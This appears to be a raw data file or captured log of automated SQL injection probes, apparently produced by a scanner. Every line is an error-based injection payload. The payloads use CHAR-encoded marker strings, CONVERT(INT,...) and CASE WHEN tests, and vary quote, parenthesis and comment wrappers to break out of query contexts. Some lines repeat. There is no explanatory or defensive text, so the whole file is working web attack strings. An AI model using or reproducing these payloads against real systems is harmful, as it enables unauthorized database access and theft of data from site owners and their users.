""") WHERE 2010=2010 AND 8102 IN (SELECT (CHAR(113)+CHAR(113)+CHAR(118)+CHAR(120)+CHAR(113)+(SELECT (CASE WHEN (8102=8102) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(118)+CHAR(106)+CHAR(118)+CHAR(113)))-- BdEB",1,1
) WHERE 8255=8255 AND 8102 IN (SELECT (CHAR(113)+CHAR(113)+CHAR(118)+CHAR(120)+CHAR(113)+(SELECT (CASE WHEN (8102=8102) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(118)+CHAR(106)+CHAR(118)+CHAR(113)))-- LioA,1,1
' WHERE 7573=7573 AND 8102 IN (SELECT (CHAR(113)+CHAR(113)+CHAR(118)+CHAR(120)+CHAR(113)+(SELECT (CASE WHEN (8102=8102) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(118)+CHAR(106)+CHAR(118)+CHAR(113)))-- wLuU,1,1
""" WHERE 8563=8563 AND 8102 IN (SELECT (CHAR(113)+CHAR(113)+CHAR(118)+CHAR(120)+CHAR(113)+(SELECT (CASE WHEN (8102=8102) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(118)+CHAR(106)+CHAR(118)+CHAR(113)))-- jAEt",1,1
 WHERE 7431=7431 AND 8102 IN (SELECT (CHAR(113)+CHAR(113)+CHAR(118)+CHAR(120)+CHAR(113)+(SELECT (CASE WHEN (8102=8102) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(118)+CHAR(106)+CHAR(118)+CHAR(113)))-- Wvwy,1,1
'||(SELECT CHAR(83)+CHAR(122)+CHAR(84)+CHAR(78) WHERE 7505=7505 AND 8102 IN (SELECT (CHAR(113)+CHAR(113)+CHAR(118)+CHAR(120)+CHAR(113)+(SELECT (CASE WHEN (8102=8102) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(118)+CHAR(106)+CHAR(118)+CHAR(113))))||',1,1
'||(SELECT CHAR(101)+CHAR(111)+CHAR(82)+CHAR(105) FROM DUAL WHERE 1230=1230 AND 8102 IN (SELECT (CHAR(113)+CHAR(113)+CHAR(118)+CHAR(120)+CHAR(113)+(SELECT (CASE WHEN (8102=8102) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(118)+CHAR(106)+CHAR(118)+CHAR(113))))||',1,1
'+(SELECT CHAR(101)+CHAR(81)+CHAR(87)+CHAR(72) WHERE 3310=3310 AND 8102 IN (SELECT (CHAR(113)+CHAR(113)+CHAR(118)+CHAR(120)+CHAR(113)+(SELECT (CASE WHEN (8102=8102) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(118)+CHAR(106)+CHAR(118)+CHAR(113))))+',1,1
||(SELECT CHAR(79)+CHAR(117)+CHAR(81)+CHAR(75) FROM DUAL WHERE 6262=6262 AND 8102 IN (SELECT (CHAR(113)+CHAR(113)+CHAR(118)+CHAR(120)+CHAR(113)+(SELECT (CASE WHEN (8102=8102) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(118)+CHAR(106)+CHAR(118)+CHAR(113))))||,1,1
||(SELECT CHAR(117)+CHAR(79)+CHAR(76)+CHAR(90) WHERE 6426=6426 AND 8102 IN (SELECT (CHAR(113)+CHAR(113)+CHAR(118)+CHAR(120)+CHAR(113)+(SELECT (CASE WHEN (8102=8102) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(118)+CHAR(106)+CHAR(118)+CHAR(113))))||,1,1
+(SELECT Vfqf WHERE 4407=4407 AND 8102 IN (SELECT (CHAR(113)+CHAR(113)+CHAR(118)+CHAR(120)+CHAR(113)+(SELECT (CASE WHEN (8102=8102) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(118)+CHAR(106)+CHAR(118)+CHAR(113))))+,1,1
+(SELECT CHAR(69)+CHAR(120)+CHAR(82)+CHAR(90) WHERE 5632=5632 AND 8102 IN (SELECT (CHAR(113)+CHAR(113)+CHAR(118)+CHAR(120)+CHAR(113)+(SELECT (CASE WHEN (8102=8102) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(118)+CHAR(106)+CHAR(118)+CHAR(113))))+,1,1
')) AS opjY WHERE 4473=4473 AND 8102 IN (SELECT (CHAR(113)+CHAR(113)+CHAR(118)+CHAR(120)+CHAR(113)+(SELECT (CASE WHEN (8102=8102) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(118)+CHAR(106)+CHAR(118)+CHAR(113)))-- PuWG,1,1
""")) AS sHxr WHERE 1002=1002 AND 8102 IN (SELECT (CHAR(113)+CHAR(113)+CHAR(118)+CHAR(120)+CHAR(113)+(SELECT (CASE WHEN (8102=8102) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(118)+CHAR(106)+CHAR(118)+CHAR(113)))-- IOks",1,1
)) AS ltXo WHERE 2842=2842 AND 8102 IN (SELECT (CHAR(113)+CHAR(113)+CHAR(118)+CHAR(120)+CHAR(113)+(SELECT (CASE WHEN (8102=8102) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(118)+CHAR(106)+CHAR(118)+CHAR(113)))-- izPY,1,1
') AS tuEP WHERE 1129=1129 AND 8102 IN (SELECT (CHAR(113)+CHAR(113)+CHAR(118)+CHAR(120)+CHAR(113)+(SELECT (CASE WHEN (8102=8102) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(118)+CHAR(106)+CHAR(118)+CHAR(113)))-- tEmD,1,1
""") AS qTbL WHERE 1059=1059 AND 8102 IN (SELECT (CHAR(113)+CHAR(113)+CHAR(118)+CHAR(120)+CHAR(113)+(SELECT (CASE WHEN (8102=8102) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(118)+CHAR(106)+CHAR(118)+CHAR(113)))-- liNh",1,1
) AS TDGW WHERE 6910=6910 AND 8102 IN (SELECT (CHAR(113)+CHAR(113)+CHAR(118)+CHAR(120)+CHAR(113)+(SELECT (CASE WHEN (8102=8102) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(118)+CHAR(106)+CHAR(118)+CHAR(113)))-- dqXK,1,1
` WHERE 2128=2128 AND 8102 IN (SELECT (CHAR(113)+CHAR(113)+CHAR(118)+CHAR(120)+CHAR(113)+(SELECT (CASE WHEN (8102=8102) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(118)+CHAR(106)+CHAR(118)+CHAR(113)))-- Pwoo,1,1
`) WHERE 2686=2686 AND 8102 IN (SELECT (CHAR(113)+CHAR(113)+CHAR(118)+CHAR(120)+CHAR(113)+(SELECT (CASE WHEN (8102=8102) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(118)+CHAR(106)+CHAR(118)+CHAR(113)))-- pxoU,1,1
`=`` AND 8102 IN (SELECT (CHAR(113)+CHAR(113)+CHAR(118)+CHAR(120)+CHAR(113)+(SELECT (CASE WHEN (8102=8102) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(118)+CHAR(106)+CHAR(118)+CHAR(113))) AND ``=`,1,1
"""="""" AND 8102 IN (SELECT (CHAR(113)+CHAR(113)+CHAR(118)+CHAR(120)+CHAR(113)+(SELECT (CASE WHEN (8102=8102) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(118)+CHAR(106)+CHAR(118)+CHAR(113))) AND """"=""",1,1
]-(SELECT 0 WHERE 3639=3639 AND 8102 IN (SELECT (CHAR(113)+CHAR(113)+CHAR(118)+CHAR(120)+CHAR(113)+(SELECT (CASE WHEN (8102=8102) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(118)+CHAR(106)+CHAR(118)+CHAR(113))))|[,1,1
' IN BOOLEAN MODE) AND 8102 IN (SELECT (CHAR(113)+CHAR(113)+CHAR(118)+CHAR(120)+CHAR(113)+(SELECT (CASE WHEN (8102=8102) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(118)+CHAR(106)+CHAR(118)+CHAR(113)))#,1,1
") AND 6117=CONVERT(INT,(SELECT CHAR(113)+CHAR(113)+CHAR(118)+CHAR(120)+CHAR(113)+(SELECT (CASE WHEN (6117=6117) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(118)+CHAR(106)+CHAR(118)+CHAR(113)))-- ffjJ",1,1
"') AND 6117=CONVERT(INT,(SELECT CHAR(113)+CHAR(113)+CHAR(118)+CHAR(120)+CHAR(113)+(SELECT (CASE WHEN (6117=6117) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(118)+CHAR(106)+CHAR(118)+CHAR(113)))-- hooO",1,1
"' AND 6117=CONVERT(INT,(SELECT CHAR(113)+CHAR(113)+CHAR(118)+CHAR(120)+CHAR(113)+(SELECT (CASE WHEN (6117=6117) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(118)+CHAR(106)+CHAR(118)+CHAR(113)))-- dIVO",1,1
""" AND 6117=CONVERT(INT,(SELECT CHAR(113)+CHAR(113)+CHAR(118)+CHAR(120)+CHAR(113)+(SELECT (CASE WHEN (6117=6117) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(118)+CHAR(106)+CHAR(118)+CHAR(113)))-- UXeP",1,1
") AND 6117=CONVERT(INT,(SELECT CHAR(113)+CHAR(113)+CHAR(118)+CHAR(120)+CHAR(113)+(SELECT (CASE WHEN (6117=6117) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(118)+CHAR(106)+CHAR(118)+CHAR(113))) AND (5723=5723",1,1
")) AND 6117=CONVERT(INT,(SELECT CHAR(113)+CHAR(113)+CHAR(118)+CHAR(120)+CHAR(113)+(SELECT (CASE WHEN (6117=6117) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(118)+CHAR(106)+CHAR(118)+CHAR(113))) AND ((5034=5034",1,1
"))) AND 6117=CONVERT(INT,(SELECT CHAR(113)+CHAR(113)+CHAR(118)+CHAR(120)+CHAR(113)+(SELECT (CASE WHEN (6117=6117) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(118)+CHAR(106)+CHAR(118)+CHAR(113))) AND (((8936=8936",1,1
" AND 6117=CONVERT(INT,(SELECT CHAR(113)+CHAR(113)+CHAR(118)+CHAR(120)+CHAR(113)+(SELECT (CASE WHEN (6117=6117) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(118)+CHAR(106)+CHAR(118)+CHAR(113)))",1,1
"') AND 6117=CONVERT(INT,(SELECT CHAR(113)+CHAR(113)+CHAR(118)+CHAR(120)+CHAR(113)+(SELECT (CASE WHEN (6117=6117) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(118)+CHAR(106)+CHAR(118)+CHAR(113))) AND ('yOpO'='yOpO",1,1
"')) AND 6117=CONVERT(INT,(SELECT CHAR(113)+CHAR(113)+CHAR(118)+CHAR(120)+CHAR(113)+(SELECT (CASE WHEN (6117=6117) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(118)+CHAR(106)+CHAR(118)+CHAR(113))) AND (('EvTD'='EvTD",1,1
"'))) AND 6117=CONVERT(INT,(SELECT CHAR(113)+CHAR(113)+CHAR(118)+CHAR(120)+CHAR(113)+(SELECT (CASE WHEN (6117=6117) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(118)+CHAR(106)+CHAR(118)+CHAR(113))) AND ((('EWZm'='EWZm",1,1
"' AND 6117=CONVERT(INT,(SELECT CHAR(113)+CHAR(113)+CHAR(118)+CHAR(120)+CHAR(113)+(SELECT (CASE WHEN (6117=6117) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(118)+CHAR(106)+CHAR(118)+CHAR(113))) AND 'kTBe'='kTBe",1,1
"') AND 6117=CONVERT(INT,(SELECT CHAR(113)+CHAR(113)+CHAR(118)+CHAR(120)+CHAR(113)+(SELECT (CASE WHEN (6117=6117) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(118)+CHAR(106)+CHAR(118)+CHAR(113))) AND ('lGRj' LIKE 'lGRj",1,1
"')) AND 6117=CONVERT(INT,(SELECT CHAR(113)+CHAR(113)+CHAR(118)+CHAR(120)+CHAR(113)+(SELECT (CASE WHEN (6117=6117) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(118)+CHAR(106)+CHAR(118)+CHAR(113))) AND (('qSPk' LIKE 'qSPk",1,1
"'))) AND 6117=CONVERT(INT,(SELECT CHAR(113)+CHAR(113)+CHAR(118)+CHAR(120)+CHAR(113)+(SELECT (CASE WHEN (6117=6117) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(118)+CHAR(106)+CHAR(118)+CHAR(113))) AND ((('Eqeo' LIKE 'Eqeo",1,1
"%' AND 6117=CONVERT(INT,(SELECT CHAR(113)+CHAR(113)+CHAR(118)+CHAR(120)+CHAR(113)+(SELECT (CASE WHEN (6117=6117) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(118)+CHAR(106)+CHAR(118)+CHAR(113))) AND 'kgcL%'='kgcL",1,1
"' AND 6117=CONVERT(INT,(SELECT CHAR(113)+CHAR(113)+CHAR(118)+CHAR(120)+CHAR(113)+(SELECT (CASE WHEN (6117=6117) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(118)+CHAR(106)+CHAR(118)+CHAR(113))) AND 'ZQWO' LIKE 'ZQWO",1,1
""") AND 6117=CONVERT(INT,(SELECT CHAR(113)+CHAR(113)+CHAR(118)+CHAR(120)+CHAR(113)+(SELECT (CASE WHEN (6117=6117) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(118)+CHAR(106)+CHAR(118)+CHAR(113))) AND (""WvgS""=""WvgS",1,1
""")) AND 6117=CONVERT(INT,(SELECT CHAR(113)+CHAR(113)+CHAR(118)+CHAR(120)+CHAR(113)+(SELECT (CASE WHEN (6117=6117) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(118)+CHAR(106)+CHAR(118)+CHAR(113))) AND ((""XviH""=""XviH",1,1
""")) AND 6117=CONVERT(INT,(SELECT CHAR(113)+CHAR(113)+CHAR(118)+CHAR(120)+CHAR(113)+(SELECT (CASE WHEN (6117=6117) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(118)+CHAR(106)+CHAR(118)+CHAR(113))) AND ((""XviH""=""XviH",1,1
""")) AND 6117=CONVERT(INT,(SELECT CHAR(113)+CHAR(113)+CHAR(118)+CHAR(120)+CHAR(113)+(SELECT (CASE WHEN (6117=6117) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(118)+CHAR(106)+CHAR(118)+CHAR(113))) AND ((""XviH""=""XviH",1,1
"""))) AND 6117=CONVERT(INT,(SELECT CHAR(113)+CHAR(113)+CHAR(118)+CHAR(120)+CHAR(113)+(SELECT (CASE WHEN (6117=6117) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(118)+CHAR(106)+CHAR(118)+CHAR(113))) AND (((""Mhrv""=""Mhrv",1,1
"""))) AND 6117=CONVERT(INT,(SELECT CHAR(113)+CHAR(113)+CHAR(118)+CHAR(120)+CHAR(113)+(SELECT (CASE WHEN (6117=6117) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(118)+CHAR(106)+CHAR(118)+CHAR(113))) AND (((""Mhrv""=""Mhrv",1,1
""" AND 6117=CONVERT(INT,(SELECT CHAR(113)+CHAR(113)+CHAR(118)+CHAR(120)+CHAR(113)+(SELECT (CASE WHEN (6117=6117) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(118)+CHAR(106)+CHAR(118)+CHAR(113))) AND ""tlyR""=""tlyR",1,1
""") AND 6117=CONVERT(INT,(SELECT CHAR(113)+CHAR(113)+CHAR(118)+CHAR(120)+CHAR(113)+(SELECT (CASE WHEN (6117=6117) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(118)+CHAR(106)+CHAR(118)+CHAR(113))) AND (""DgOf"" LIKE ""DgOf",1,1
""")) AND 6117=CONVERT(INT,(SELECT CHAR(113)+CHAR(113)+CHAR(118)+CHAR(120)+CHAR(113)+(SELECT (CASE WHEN (6117=6117) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(118)+CHAR(106)+CHAR(118)+CHAR(113))) AND ((""LJXW"" LIKE ""LJXW",1,1
"""))) AND 6117=CONVERT(INT,(SELECT CHAR(113)+CHAR(113)+CHAR(118)+CHAR(120)+CHAR(113)+(SELECT (CASE WHEN (6117=6117) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(118)+CHAR(106)+CHAR(118)+CHAR(113))) AND (((""Sizq"" LIKE ""Sizq",1,1
""" AND 6117=CONVERT(INT,(SELECT CHAR(113)+CHAR(113)+CHAR(118)+CHAR(120)+CHAR(113)+(SELECT (CASE WHEN (6117=6117) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(118)+CHAR(106)+CHAR(118)+CHAR(113))) AND ""pHIj"" LIKE ""pHIj",1,1
" AND 6117=CONVERT(INT,(SELECT CHAR(113)+CHAR(113)+CHAR(118)+CHAR(120)+CHAR(113)+(SELECT (CASE WHEN (6117=6117) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(118)+CHAR(106)+CHAR(118)+CHAR(113)))-- iKsL",1,1
" AND 6117=CONVERT(INT,(SELECT CHAR(113)+CHAR(113)+CHAR(118)+CHAR(120)+CHAR(113)+(SELECT (CASE WHEN (6117=6117) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(118)+CHAR(106)+CHAR(118)+CHAR(113)))# FBWq",1,1
"' AND 6117=CONVERT(INT,(SELECT CHAR(113)+CHAR(113)+CHAR(118)+CHAR(120)+CHAR(113)+(SELECT (CASE WHEN (6117=6117) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(118)+CHAR(106)+CHAR(118)+CHAR(113))) OR 'bltg'='xskb",1,1
"') WHERE 6749=6749 AND 6117=CONVERT(INT,(SELECT CHAR(113)+CHAR(113)+CHAR(118)+CHAR(120)+CHAR(113)+(SELECT (CASE WHEN (6117=6117) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(118)+CHAR(106)+CHAR(118)+CHAR(113)))-- lIoS",1,1
""") WHERE 5773=5773 AND 6117=CONVERT(INT,(SELECT CHAR(113)+CHAR(113)+CHAR(118)+CHAR(120)+CHAR(113)+(SELECT (CASE WHEN (6117=6117) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(118)+CHAR(106)+CHAR(118)+CHAR(113)))-- GSeR",1,1
") WHERE 6904=6904 AND 6117=CONVERT(INT,(SELECT CHAR(113)+CHAR(113)+CHAR(118)+CHAR(120)+CHAR(113)+(SELECT (CASE WHEN (6117=6117) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(118)+CHAR(106)+CHAR(118)+CHAR(113)))-- dusJ",1,1
"' WHERE 4880=4880 AND 6117=CONVERT(INT,(SELECT CHAR(113)+CHAR(113)+CHAR(118)+CHAR(120)+CHAR(113)+(SELECT (CASE WHEN (6117=6117) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(118)+CHAR(106)+CHAR(118)+CHAR(113)))-- VEZd",1,1
""" WHERE 9132=9132 AND 6117=CONVERT(INT,(SELECT CHAR(113)+CHAR(113)+CHAR(118)+CHAR(120)+CHAR(113)+(SELECT (CASE WHEN (6117=6117) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(118)+CHAR(106)+CHAR(118)+CHAR(113)))-- qcVd",1,1
" WHERE 8045=8045 AND 6117=CONVERT(INT,(SELECT CHAR(113)+CHAR(113)+CHAR(118)+CHAR(120)+CHAR(113)+(SELECT (CASE WHEN (6117=6117) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(118)+CHAR(106)+CHAR(118)+CHAR(113)))-- Aznr",1,1
"'||(SELECT CHAR(66)+CHAR(72)+CHAR(119)+CHAR(89) WHERE 1287=1287 AND 6117=CONVERT(INT,(SELECT CHAR(113)+CHAR(113)+CHAR(118)+CHAR(120)+CHAR(113)+(SELECT (CASE WHEN (6117=6117) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(118)+CHAR(106)+CHAR(118)+CHAR(113))))||'",1,1
"'||(SELECT CHAR(66)+CHAR(72)+CHAR(119)+CHAR(89) WHERE 1287=1287 AND 6117=CONVERT(INT,(SELECT CHAR(113)+CHAR(113)+CHAR(118)+CHAR(120)+CHAR(113)+(SELECT (CASE WHEN (6117=6117) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(118)+CHAR(106)+CHAR(118)+CHAR(113))))||'",1,1
"'||(SELECT CHAR(69)+CHAR(81)+CHAR(105)+CHAR(106) FROM DUAL WHERE 8334=8334 AND 6117=CONVERT(INT,(SELECT CHAR(113)+CHAR(113)+CHAR(118)+CHAR(120)+CHAR(113)+(SELECT (CASE WHEN (6117=6117) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(118)+CHAR(106)+CHAR(118)+CHAR(113))))||'",1,1
"'+(SELECT CHAR(119)+CHAR(80)+CHAR(67)+CHAR(119) WHERE 2696=2696 AND 6117=CONVERT(INT,(SELECT CHAR(113)+CHAR(113)+CHAR(118)+CHAR(120)+CHAR(113)+(SELECT (CASE WHEN (6117=6117) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(118)+CHAR(106)+CHAR(118)+CHAR(113))))+'",1,1
"'+(SELECT CHAR(119)+CHAR(80)+CHAR(67)+CHAR(119) WHERE 2696=2696 AND 6117=CONVERT(INT,(SELECT CHAR(113)+CHAR(113)+CHAR(118)+CHAR(120)+CHAR(113)+(SELECT (CASE WHEN (6117=6117) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(118)+CHAR(106)+CHAR(118)+CHAR(113))))+'",1,1
"||(SELECT CHAR(120)+CHAR(102)+CHAR(116)+CHAR(122) FROM DUAL WHERE 9938=9938 AND 6117=CONVERT(INT,(SELECT CHAR(113)+CHAR(113)+CHAR(118)+CHAR(120)+CHAR(113)+(SELECT (CASE WHEN (6117=6117) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(118)+CHAR(106)+CHAR(118)+CHAR(113))))||",1,1
"||(SELECT CHAR(120)+CHAR(102)+CHAR(116)+CHAR(122) FROM DUAL WHERE 9938=9938 AND 6117=CONVERT(INT,(SELECT CHAR(113)+CHAR(113)+CHAR(118)+CHAR(120)+CHAR(113)+(SELECT (CASE WHEN (6117=6117) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(118)+CHAR(106)+CHAR(118)+CHAR(113))))||",1,1
"||(SELECT CHAR(120)+CHAR(102)+CHAR(116)+CHAR(122) FROM DUAL WHERE 9938=9938 AND 6117=CONVERT(INT,(SELECT CHAR(113)+CHAR(113)+CHAR(118)+CHAR(120)+CHAR(113)+(SELECT (CASE WHEN (6117=6117) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(118)+CHAR(106)+CHAR(118)+CHAR(113))))||",1,1
"||(SELECT CHAR(120)+CHAR(102)+CHAR(116)+CHAR(122) FROM DUAL WHERE 9938=9938 AND 6117=CONVERT(INT,(SELECT CHAR(113)+CHAR(113)+CHAR(118)+CHAR(120)+CHAR(113)+(SELECT (CASE WHEN (6117=6117) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(118)+CHAR(106)+CHAR(118)+CHAR(113))))||",1,1
"||(SELECT CHAR(81)+CHAR(121)+CHAR(110)+CHAR(97) WHERE 8180=8180 AND 6117=CONVERT(INT,(SELECT CHAR(113)+CHAR(113)+CHAR(118)+CHAR(120)+CHAR(113)+(SELECT (CASE WHEN (6117=6117) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(118)+CHAR(106)+CHAR(118)+CHAR(113))))||",1,1
""") AS QKfr WHERE 2425=2425 AND 6117=CONVERT(INT,(SELECT CHAR(113)+CHAR(113)+CHAR(118)+CHAR(120)+CHAR(113)+(SELECT (CASE WHEN (6117=6117) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(118)+CHAR(106)+CHAR(118)+CHAR(113)))-- KpWO",1,1
") AS BKzc WHERE 4259=4259 AND 6117=CONVERT(INT,(SELECT CHAR(113)+CHAR(113)+CHAR(118)+CHAR(120)+CHAR(113)+(SELECT (CASE WHEN (6117=6117) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(118)+CHAR(106)+CHAR(118)+CHAR(113)))-- yfyE",1,1
"` WHERE 3712=3712 AND 6117=CONVERT(INT,(SELECT CHAR(113)+CHAR(113)+CHAR(118)+CHAR(120)+CHAR(113)+(SELECT (CASE WHEN (6117=6117) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(118)+CHAR(106)+CHAR(118)+CHAR(113)))-- nFXa",1,1
"`) WHERE 6044=6044 AND 6117=CONVERT(INT,(SELECT CHAR(113)+CHAR(113)+CHAR(118)+CHAR(120)+CHAR(113)+(SELECT (CASE WHEN (6117=6117) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(118)+CHAR(106)+CHAR(118)+CHAR(113)))-- GfvD",1,1
"`=`` AND 6117=CONVERT(INT,(SELECT CHAR(113)+CHAR(113)+CHAR(118)+CHAR(120)+CHAR(113)+(SELECT (CASE WHEN (6117=6117) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(118)+CHAR(106)+CHAR(118)+CHAR(113))) AND ``=`",1,1
"""="""" AND 6117=CONVERT(INT,(SELECT CHAR(113)+CHAR(113)+CHAR(118)+CHAR(120)+CHAR(113)+(SELECT (CASE WHEN (6117=6117) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(118)+CHAR(106)+CHAR(118)+CHAR(113))) AND """"=""",1,1
"]-(SELECT 0 WHERE 9236=9236 AND 6117=CONVERT(INT,(SELECT CHAR(113)+CHAR(113)+CHAR(118)+CHAR(120)+CHAR(113)+(SELECT (CASE WHEN (6117=6117) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(118)+CHAR(106)+CHAR(118)+CHAR(113))))|[",1,1
"' IN BOOLEAN MODE) AND 6117=CONVERT(INT,(SELECT CHAR(113)+CHAR(113)+CHAR(118)+CHAR(120)+CHAR(113)+(SELECT (CASE WHEN (6117=6117) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(118)+CHAR(106)+CHAR(118)+CHAR(113)))#",1,1
") AND 9959=CONCAT(CHAR(113)+CHAR(113)+CHAR(118)+CHAR(120)+CHAR(113),(SELECT (CASE WHEN (9959=9959) THEN CHAR(49) ELSE CHAR(48) END)),CHAR(113)+CHAR(118)+CHAR(106)+CHAR(118)+CHAR(113))-- VfWb",1,1
"') AND 9959=CONCAT(CHAR(113)+CHAR(113)+CHAR(118)+CHAR(120)+CHAR(113),(SELECT (CASE WHEN (9959=9959) THEN CHAR(49) ELSE CHAR(48) END)),CHAR(113)+CHAR(118)+CHAR(106)+CHAR(118)+CHAR(113))-- GJvS",1,1
